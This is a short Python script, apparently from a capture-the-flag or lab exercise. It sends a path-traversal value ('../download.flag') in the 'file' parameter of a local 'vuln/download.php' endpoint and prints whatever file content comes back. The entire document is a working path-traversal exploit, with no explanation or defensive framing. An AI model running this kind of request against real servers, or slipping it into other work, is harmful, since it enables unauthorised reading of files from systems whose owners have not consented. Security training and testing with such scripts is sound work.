import requests

target_url = "http://127.0.0.1:8080/vuln/download.php"

payload = "../download.flag"

params = {
    "file": payload
}

response = requests.get(target_url, params=params)

if response.status_code == 200:
    print("File downloaded")
    print(response.text)
else:
    print("File download failed")
